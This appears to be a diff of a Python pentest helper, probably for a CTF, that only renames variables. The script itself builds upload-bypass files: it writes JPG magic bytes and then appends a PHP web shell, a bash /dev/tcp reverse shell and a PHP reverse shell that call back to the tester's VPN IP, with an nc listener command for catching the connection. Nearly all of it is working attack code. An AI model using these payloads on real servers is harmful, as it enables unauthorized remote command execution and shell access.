@@ -10,17 +10,17 @@ vpn_ip = ipv4 = (
     .read()
     .strip()
 )
-port = 9003
+PORT = 9003
 print(
-    f"Run `nc -lvnp {port}` will need to be used when waiting for reverse shell callback"
+    f"Run `nc -lvnp {PORT}` will need to be used when waiting for reverse shell callback"
 )
 
 types_files = {
     "rce": "<?php system($_REQUEST['cmd']);?>",
-    "sh_revshell": f"bash -i >& /dev/tcp/{vpn_ip}/{port} 0>&1",
+    "sh_revshell": f"bash -i >& /dev/tcp/{vpn_ip}/{PORT} 0>&1",
 }
 # Thanks pentestmonkies!
-php_revshell = """<?php
+PHP_REVSHELL = """<?php
 
 set_time_limit (0);
 $VERSION = "1.0";
@@ -134,24 +134,24 @@ function printit ($string) {{
 }}
 
 ?>""".format(
-    vpn_ip, port
+    vpn_ip, PORT
 )
-types_files["php_revshell"] = php_revshell
+types_files["php_revshell"] = PHP_REVSHELL
 
 # create our files only writing our magic headers (just jpg for now)
-magic = file_signatures["JPG"]
+MAGIC = file_signatures["JPG"]
 
 for file_name in ["cmd.php.exe", "rev-shell.php.jpg", "rev-shell.sh.jpg"]:
     # make them appear to be jpg
     with open(file_name, "wb") as f:
-        f.write(magic)
+        f.write(MAGIC)
 
     # append actual script content now
     if "cmd" in file_name:
-        content = types_files["rce"]
+        CONTENT = types_files["rce"]
     elif "php" in file_name:
-        content = types_files["php_revshell"]
+        CONTENT = types_files["php_revshell"]
     else:
-        content = types_files["sh_revshell"]
+        CONTENT = types_files["sh_revshell"]
     with open(file_name, "a") as f:
-        f.write(content)
+        f.write(CONTENT)
